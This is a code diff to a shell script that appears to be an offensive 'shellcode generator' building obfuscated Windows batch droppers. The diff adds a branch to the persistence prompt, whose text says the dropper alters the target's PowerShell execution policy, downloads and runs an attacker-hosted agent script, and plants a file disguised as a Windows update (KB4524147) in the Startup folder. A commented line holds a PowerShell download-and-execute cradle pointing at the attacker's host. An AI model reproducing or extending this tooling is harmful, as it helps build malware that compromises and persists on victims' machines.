@@ -12251,7 +12251,11 @@ echo "---"
 ## BUILD DROPPER
 # echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
 echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 2
-persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\nHow It Works: '$Drop.bat' IF executed will change target PS execution\nPolicy to allow the auto-execution of PS scripts downloaded from network, then\nit will download/exec our '$NaM.ps1' (to the UPLOAD Location chosen\nby attacker) and writes 'KB4524147_$random_name.update.bat' into target Startup folder.\nKB4524147_$random_name.update.bat will execute our '$NaM.ps1' on every reboot." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
+if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
+   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\nHow It Works: '$Drop.bat' IF executed will change target PS execution\nPolicy to allow the auto-execution of PS scripts downloaded from network, then\nit will download/exec our '$NaM.ps1' (to the UPLOAD Location chosen\nby attacker) and writes 'KB4524147_$random_name.update.vbs' into target Startup folder.\nKB4524147_$random_name.update.vbs will execute our '$NaM.ps1' on every reboot." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
+else
+   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\nHow It Works: '$Drop.bat' IF executed will change target PS execution\nPolicy to allow the auto-execution of PS scripts downloaded from network, then\nit will download/exec our '$NaM.ps1' (to the UPLOAD Location chosen\nby attacker) and writes 'KB4524147_$random_name.update.bat' into target Startup folder.\nKB4524147_$random_name.update.bat will execute our '$NaM.ps1' on every reboot." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
+fi
 
 if [ "$persistence" = "Dont Add Persistence" ]; then
    ## Default dropper Build
@@ -12490,7 +12494,11 @@ echo "---"
 ## BUILD DROPPER (to download/execute our agent.ps1).
 # echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1 # <-- OLD DELIVERY METHOD (dropper)
 echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 2
-persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\nHow It Works: '$Drop.$ext.bat' IF executed will change target PS execution\nPolicy to allow the auto-execution of PS scripts downloaded from network, then\nit will download/exec our '$NaM.ps1' (to the UPLOAD Location chosen\nby attacker) and writes 'KB4524147_$random_name.update.bat' into target Startup folder.\nKB4524147_$random_name.update.bat will execute our '$NaM.ps1' on every reboot." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
+if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
+   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\nHow It Works: '$Drop.$ext.bat' IF executed will change target PS execution\nPolicy to allow the auto-execution of PS scripts downloaded from network, then\nit will download/exec our '$NaM.ps1' (to the UPLOAD Location chosen\nby attacker) and writes 'KB4524147_$random_name.update.vbs' into target Startup folder.\nKB4524147_$random_name.update.vbs will execute our '$NaM.ps1' on every reboot." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
+else
+   persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\nHow It Works: '$Drop.$ext.bat' IF executed will change target PS execution\nPolicy to allow the auto-execution of PS scripts downloaded from network, then\nit will download/exec our '$NaM.ps1' (to the UPLOAD Location chosen\nby attacker) and writes 'KB4524147_$random_name.update.bat' into target Startup folder.\nKB4524147_$random_name.update.bat will execute our '$NaM.ps1' on every reboot." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
+fi
 
 if [ "$persistence" = "Dont Add Persistence" ]; then
    echo "@echo off" > $IPATH/output/$Drop.$ext.bat
